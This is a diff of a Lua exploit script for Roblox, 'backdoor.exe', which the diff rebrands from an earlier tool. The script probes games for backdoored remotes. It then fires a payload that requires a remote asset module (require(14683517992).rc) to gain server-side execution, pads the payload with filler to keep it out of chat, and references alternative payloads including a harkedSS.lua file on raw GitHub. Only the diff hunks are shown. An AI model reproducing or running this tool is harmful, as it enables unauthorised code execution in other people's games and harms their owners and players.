@@ -1,4 +1,18 @@
--- As some people may know, we obfuscated source script. Here is the deobfuscated script so nobody needs to leak it again, as it's a opensource project open to pull requests.
+--[[
+    backdoor.exe, the best backdoor scanner in Roblox.
+    Copyright (C) 2021	iK4oS
+    This program is free software: you can redistribute it and/or modify
+    it under the terms of the GNU General Public License as published by
+    the Free Software Foundation, either version 3 of the License, or
+    (at your option) any later version.
+    This program is distributed in the hope that it will be useful,
+    but WITHOUT ANY WARRANTY; without even the implied warranty of
+    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+    GNU General Public License for more details.
+    You should have received a copy of the GNU General Public License
+    along with this program.  If not, see <https://www.gnu.org/licenses/>.
+]]
+
 local dateTimeNow = DateTime.now
 local tableFind = table.find
 local taskSpawn = task.spawn
@@ -12,21 +26,21 @@ local StarterGui = game:GetService("StarterGui")
 
 local LocalPlayer = game:GetService("Players").LocalPlayer
 local requireScript = ("require(14683517992).rc('%s', %s) -- "):format(LocalPlayer.Name, "true", string.rep("!", 2400)) -- set true to false to disable logging, we add a filler so that the backdoor code won't be send to the chat, by default, only message with 200 characters (or 1,200 bytes) can be send, we multipy it by 2 to be safe.
-local invCode = "v5YksgwtaR"
+local invCode = "6HndYgC"
 
 local alternativeSS = {
 	run = { [1] = "5#lGIERKWEF" },
 	emma = { [1] = "pwojr8hoc0-gr0yxohlgp-0feb7ncxed", [2] = ",,,,,,,,,,,,,,," },
 	helpme = { [1] = "helpme" },
 	pickett = { [1] = "cGlja2V0dA==" },
-	harked = "https://raw.githubusercontent.com/L1ghtingBolt/FraktureSS/master/harkedSS.lua"
+	harked = "https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/harkedSS.lua"
 }
 
 local function notify(text)
 	StarterGui:SetCore(
 		"SendNotification",
 		{
-			Title = "Rc7",
+			Title = "backdoor.exe",
 			Duration = 3,
 			Text = text
 		}
@@ -35,16 +49,16 @@ end
 
 local function attached(possibleWait)
 	local PlayerGui =  LocalPlayer.PlayerGui
-    
+
 	if possibleWait then
 		local start = dateTimeNow().UnixTimestampMillis
 		local possibleWait = possibleWait * 1000
-		while PlayerGui and not PlayerGui:FindFirstChild("frakture.ss") and (possibleWait > dateTimeNow().UnixTimestampMillis - start) do
+		while PlayerGui and not PlayerGui:FindFirstChild("backdoor.exe") and (possibleWait > dateTimeNow().UnixTimestampMillis - start) do
 			taskWait()
 		end
 	end
 
-	return PlayerGui and PlayerGui:FindFirstChild("frakture.ss")
+	return PlayerGui and PlayerGui:FindFirstChild("backdoor.exe")
 end
 
 local function validRemote(rm)
@@ -56,7 +70,7 @@ local function validRemote(rm)
 
 	if Parent then
 		if Parent == JointsService then return false end
-        
+
         -- Addonis Check
 		if (Parent == ReplicatedStorage and rm:FindFirstChild("__FUNCTION")) or
         (rm.Name == "__FUNCTION" and Parent.ClassName == "RemoteEvent" and Parent.Parent == ReplicatedStorage) then return false end
@@ -148,12 +162,23 @@ local function scanGame()
 end
 
 local function Main()
-	notify(("Join my discord you skid\nCode: %s"):format(invCode))
+	notify(("Make sure to join our Discord!\nCode: %s"):format(invCode))
 
 	scanGame()
 
+	if not attached(3.5) then
+		notify("Unable to find backdoor.\nGame not backdoored?")
+	end
 end
 
 if game:IsLoaded() then
 	pcall(Main)
 end
+
+--	k4scripts
+--	.------.
+--	|4.--. |
+--	| :│/: |
+--	| :│\: |
+--	| '--'4|
+--	`------'
